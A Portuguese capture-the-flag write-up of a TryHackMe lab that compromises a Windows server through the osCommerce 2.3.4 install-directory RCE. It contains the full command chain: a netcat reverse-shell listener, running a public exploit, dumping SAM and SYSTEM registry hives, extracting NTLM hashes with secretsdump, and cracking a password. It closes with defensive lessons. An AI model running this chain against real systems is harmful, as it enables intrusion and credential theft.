---
title: "Blueprint"
date: 2026-06-27
summary: "Exploração de RCE no osCommerce 2.3.4 em um servidor Windows e extração de hashes NTLM."
platform: "TryHackMe"
difficulty: "Fácil"
os: "Windows"
tags: ["RCE", "osCommerce", "Windows", "NTLM"]
draft: false
---

## Visão Geral

A máquina Blueprint é um desafio de nível fácil que simula um servidor Windows com uma aplicação de e-commerce mal configurada e desatualizada. O vetor de ataque principal é uma vulnerabilidade de **Execução Remota de Código (RCE)** no **osCommerce 2.3.4**, causada pelo diretório de instalação (`/install/`) deixado acessível ao público após a implantação. A exploração dessa falha entrega acesso imediato com privilégios de `SYSTEM`, o que permite extrair as *hashes* NTLM dos usuários locais diretamente do registro do Windows e quebrá-las *offline* para obter a senha em texto claro.

## Reconhecimento

### Varredura de Portas

Iniciei o reconhecimento com uma varredura abrangente usando o **Nmap**, escaneando todas as portas TCP com detecção de versão e execução dos scripts padrão.

*Varredura de portas e serviços com Nmap*
```bash
nmap -p- -sV -sC -T4 --min-rate 5000 blueprint.thm
```

A varredura retornou as seguintes portas abertas:

- **Porta 80**: HTTP --- Microsoft IIS 7.5
- **Porta 135**: MSRPC
- **Porta 139**: NetBIOS-SSN (SMB)
- **Porta 443**: HTTPS --- Apache/2.4.23 (Win32) OpenSSL
- **Porta 445**: Microsoft-DS (SMB)
- **Porta 3306**: MySQL --- MariaDB
- **Porta 8080**: HTTP --- Apache/2.4.23 (Win32) PHP/5.6.28
- **Porta 49152--49160**: MSRPC (várias)


*Resultado truncado da varredura do Nmap*
```bash
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  ssl/http
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
8080/tcp  open  http-proxy
[...]
```

O ponto de maior interesse foi imediatamente a **porta 8080**, rodando Apache com PHP --- indicativo de uma aplicação web dinâmica hospedada fora do IIS padrão. A presença do **MySQL** na porta 3306 reforçou a hipótese de uma aplicação web com banco de dados, um alvo clássico para enumeração de vulnerabilidades conhecidas.

### Enumeração da Aplicação Web

Ao acessar `http://blueprint.thm:8080/` no navegador, fui direcionado para uma instalação do **osCommerce 2.3.4**, uma plataforma de e-commerce open-source desatualizada.

![Página inicial do osCommerce 2.3.4 exposta na porta 8080.](/images/writeups/blueprint/blueprint-8080.png)

Ao navegar para o caminho `/catalog/install/`, o assistente de instalação do osCommerce estava completamente acessível, sem nenhum controle de acesso. Essa é uma falha de configuração gravíssima: o diretório `install/` nunca deveria estar exposto em um ambiente de produção, pois permite que qualquer pessoa reinicie o processo de instalação e injete código malicioso nos arquivos de configuração da aplicação.

## Exploração Inicial

### Pesquisa de Exploit

Confirmada a versão do osCommerce, consultei o banco de dados do **Exploit-DB** com o **searchsploit** para verificar vulnerabilidades conhecidas.

*Busca por exploits do osCommerce com searchsploit*
```bash
searchsploit oscommerce 2.3.4
```

O **searchsploit** listou um exploit de **Remote Code Execution (RCE)** para a versão 2.3.4, identificado como **CVE-2018-18574** / EDB-ID 44374. A vulnerabilidade permite que um atacante não autenticado injete código PHP arbitrário no arquivo `includes/configure.php` durante o processo de (re)instalação, obtendo execução de código no servidor.

### Obtenção de Shell

Para explorar a vulnerabilidade, utilizei um script Python de PoC (*Proof of Concept*) disponível publicamente. O exploit abusa do processo de instalação do osCommerce para injetar um *payload* PHP no arquivo de configuração da aplicação.

Antes de executar o exploit, abri um *listener* com o **Netcat** para receber a conexão reversa.

*Inicializando o ouvinte para o reverse shell*
```bash
nc -lnvp 4444
```

Em seguida, executei o script de exploit apontando para a URL da aplicação:

*Execução do exploit de RCE contra o osCommerce 2.3.4*
```bash
python3 exploit_oscommerce.py \
http://blueprint.thm:8080/catalog/
```

O exploit injetou um *webshell* PHP no arquivo de configuração da aplicação e, ao ser acionado, enviou uma conexão reversa para o meu *listener*.

*Shell recebido truncado*
```bash
C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes> whoami
nt authority\system
[...]
```

A sessão foi estabelecida diretamente como `NT AUTHORITY\ SYSTEM` --- o nível mais alto de privilégio no Windows. Isso ocorre porque o servidor Apache/XAMPP estava configurado para rodar com privilégios de SYSTEM, eliminando a necessidade de uma etapa separada de escalada de privilégios.

## Pós-Exploração e Extração de Credenciais

### Dump das Hives do Registro

Com acesso como SYSTEM, pude extrair as *hashes* de senhas dos usuários locais diretamente das *hives* de registro do Windows (`SAM` e `SYSTEM`). Salvei os arquivos em um diretório dentro do servidor web para facilitar o download.

*Extração das hives SAM e SYSTEM do registro do Windows*
```bash
reg save HKLM\SAM C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes\sam.save
reg save HKLM\SYSTEM C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes\system.save
```

Em seguida, baixei os dois arquivos na minha máquina de ataque via `wget`:

*Download das hives salvas via HTTP*
```bash
wget http://blueprint.thm:8080/catalog/install/includes/sam.save
wget http://blueprint.thm:8080/catalog/install/includes/system.save
```

### Extração das Hashes NTLM

Com os arquivos em mãos, utilizei o **impacket-secretsdump** para extrair os hashes NTLM dos usuários locais.

*Extração de hashes NTLM com impacket-secretsdump*
```bash
impacket-secretsdump -sam sam.save -system system.save LOCAL
```

*Saída truncada do impacket-secretsdump*
```bash
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:549a1bcb88e35dc18c7a0b0168631411:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Lab:1000:aad3b435b51404eeaad3b435b51404ee:30e87bf999828446a1c1209ddde4c450:::
[...]
```

A saída exibiu as *hashes* de todos os usuários locais, incluindo o usuário `Lab`, no formato:

*Formato da saída com a hash NTLM do usuário Lab*
```bash
Lab:1000:aad3b435b51404eeaad3b435b51404ee:<HASH-NTLM-AQUI>:::
```

### Quebra da Hash com CrackStation

Copiei a parte da *hash* NTLM (a segunda metade após o último `:`) e joguei no **CrackStation**. O serviço identificou a senha correspondente instantaneamente a partir de seu banco de dados de *rainbow tables*.

*Resultado truncado da quebra de hash*
```bash
Hash                             Type    Result
30e87bf999828446a1c1209ddde4c450 NTLM    googleplus
[...]
```

Com a senha em texto claro, as credenciais do usuário `Lab` foram completamente comprometidas.

## Captura das Flags

Com o shell já rodando como `NT AUTHORITY\ SYSTEM`, a coleta das *flags* foi direta. Naveguei até os diretórios dos usuários para ler os arquivos de *flag*.

*Captura da flag do usuário Lab*
```bash
type C:\Users\Lab\Desktop\user.txt
```

*Captura da flag do Administrador*
```bash
type C:\Users\Administrator\Desktop\root.txt
```

*Captura truncada das flags*
```bash
C:\> type C:\Users\Lab\Desktop\user.txt
THM{...truncado...}

C:\> type C:\Users\Administrator\Desktop\root.txt
THM{...truncado...}
```

## Conclusão

A máquina Blueprint{} ilustra de forma didática como um único descuido na implantação de uma aplicação web pode resultar na comprometimento total de um servidor. A raiz de toda a exploração foi a negligência de não remover ou restringir o acesso ao diretório `/install/` após a configuração inicial do osCommerce --- um erro documentado e amplamente conhecido.

Os principais aprendizados desta máquina são:

- **Nunca deixe diretórios de instalação acessíveis em produção**: O diretório `/install/` de qualquer *CMS* ou aplicação web deve ser removido ou ter seu acesso bloqueado imediatamente após a implantação. Sua presença é uma vulnerabilidade crítica de RCE.

- **Mantenha as dependências atualizadas**: O osCommerce 2.3.4 possui vulnerabilidades conhecidas e publicamente documentadas no Exploit-DB. A atualização contínua do software é uma das medidas de segurança mais básicas e eficazes.

- **Princípio do menor privilégio para serviços web**: O fato de o Apache rodar como `NT AUTHORITY\ SYSTEM` eliminou qualquer barreira pós-exploração. Serviços web jamais devem rodar com privilégios administrativos. Uma conta de serviço dedicada e com permissões mínimas teria forçado o atacante a realizar uma etapa adicional de escalada de privilégios.

- **Hashes NTLM são credenciais**: A extração de *hashes* do registro do Windows não requer nenhuma ferramenta sofisticada --- apenas acesso privilegiado. Senhas fracas são facilmente quebradas com ferramentas como o CrackStation, tornando o uso de senhas longas e complexas essencial para a defesa em profundidade.


## Referências

- TryHackMe. *Blueprint --- Windows Penetration Testing Challenge*. Disponível em: <https://tryhackme.com/room/blueprint>
- Exploit-DB. *osCommerce 2.3.4 --- Remote Code Execution (EDB-ID 44374)*. Disponível em: <https://www.exploit-db.com/exploits/44374>
- SecureAuth Corporation. *Impacket --- Collection of Python Classes for Working with Network Protocols*. Disponível em: <https://github.com/fortra/impacket>
- CrackStation. *Free Password Hash Cracker*. Disponível em: <https://crackstation.net/>
- HackTricks. *Stealing Windows Credentials --- SAM \& LSA Secrets*. Disponível em: <https://book.hacktricks.xyz/windows-hardening/stealing-credentials>
- NIST NVD. *CVE-2018-18574 --- osCommerce 2.3.4 Remote Code Execution*. Disponível em: <https://nvd.nist.gov/vuln/detail/CVE-2018-18574>
